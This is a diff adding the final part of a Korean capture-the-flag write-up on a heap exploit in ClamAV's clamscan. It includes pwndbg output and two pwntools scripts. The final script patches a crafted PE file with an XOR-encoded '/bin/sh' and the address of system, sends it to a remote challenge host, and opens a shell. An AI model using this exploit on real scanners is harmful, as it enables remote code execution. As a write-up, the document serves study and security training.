@@ -225,3 +225,86 @@ pwndbg의 heap 커맨드를 사용해보면 할당되어 있는 힙을 볼 수 �
 
 
 수 많은 함수 포인터 중 하나는 탑 청크와 바로 위에 위치해서 이를 사용하기로 했다. ddst를 연산하는 `libclamav.so.9_base + 0x107efe`에 브레이크 포인트를 설정하고 그때 힙 주소와 탑 청크 바로 위의 함수 포인터의 거리를 계산해주면 된다.
+
+다음과 같은 코드를 작성했다.
+
+```python
+from pwn import *
+
+p = remote("localhost", 10000)
+
+data = open("exp.exe").read()
+
+original_offset = '\x74\x60\x00\x00'
+binsh_offset = p32(0x180d0)
+
+payload = ''
+payload += data.replace(original_offset, binsh_offset)
+
+p.sendlineafter(': ', '1')
+p.sendlineafter(': ', str(len(payload)))
+p.sendlineafter(': ', payload)
+p.interactive()
+```
+
+
+
+디버깅을 통해 binsh가 위치할 부분과 현재 힙 거리를 연산하여 넣어주었다. 이제 값을 1byte씩 삽입할텐데 몇글자나 삽입 가능한지 보기 위하여 테스트했다.
+
+```
+pwndbg> x/2gx 0x30150b0
+0x30150b0:	0x00007fb035c9c8f0	0x00007fb035c9c900
+
+pwndbg> continue
+
+pwndbg> x/2gx 0x30150b0
+0x30150b0:	0x313f2a14130b3500	0x00007fb035c9340c
+```
+
+
+
+총 10byte가 순차적으로 입력되었다. 파일 하나로 익스플로잇을 하는 방법도 있지만 파일 2개를 가지고 하나는 /bin/sh, 또 하나는 system@plt를 쓰는것이 편할 것이다. 파일을 2개를 넣었을 때의 offset을 확인 한 뒤 xor에 주의하여 익스플로잇을 완성하면 된다.
+
+
+
+익스플로잇 코드는 다음과 같다.
+
+```python
+from pwn import *
+
+def encode(data):
+    result = ''
+    size = 0x63
+    data = data.ljust(10, '\x00')
+
+    for i in range(10):
+        result += chr(ord(data[i]) ^ size)
+        size -= 1
+
+    return result
+    
+#p = remote("localhost", 10000)
+p = remote("141.164.48.191", 10000)
+e = ELF('./clamscan')
+
+data = open("exp.exe").read()
+
+original_offset = '\x74\x60\x00\x00'
+original_ssrc = "VirtualPro"
+binsh_offset = p32(0x180d0-1)
+system_offset = p32(0x7c318-1)
+
+payload = data.replace(original_offset, binsh_offset)
+payload = payload.replace(original_ssrc, encode('/bin/sh'))
+
+payload2 = data.replace(original_offset, system_offset)
+payload2 = payload2.replace(original_ssrc, encode(p64(e.sym['system'])))
+
+p.sendlineafter(': ', '2')
+p.sendlineafter(': ', str(len(payload)))
+p.sendafter(': ', payload)
+p.sendlineafter(': ', str(len(payload2)))
+p.sendafter(': ', payload2)
+
+p.interactive()
+```
